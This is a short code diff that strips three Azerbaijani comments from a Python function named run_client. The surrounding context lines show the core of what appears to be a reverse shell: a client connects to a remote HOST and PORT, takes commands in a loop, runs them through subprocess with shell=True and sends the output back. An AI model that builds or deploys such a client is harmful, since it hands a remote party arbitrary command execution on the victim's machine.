@@ -10,7 +10,6 @@ def run_client():
     try:
         client.connect((HOST, PORT))
     except Exception as e:
-        # Bağlantı qurulmazsa bir müddət sonra yenidən cəhd edə bilər
         return
 
     while True:
@@ -21,7 +20,6 @@ def run_client():
             if command.lower() == 'exit':
                 break
             
-            # Komandanı əməliyyat sistemində icra et
             output = subprocess.run(
                 command, 
                 shell=True, 
@@ -29,7 +27,6 @@ def run_client():
                 text=True
             )
             
-            # Nəticəni və ya xətanı hazırla
             result = output.stdout + output.stderr
             if not result:
                 result = "[+] Komanda icra olundu (çıxış yoxdur).\n"
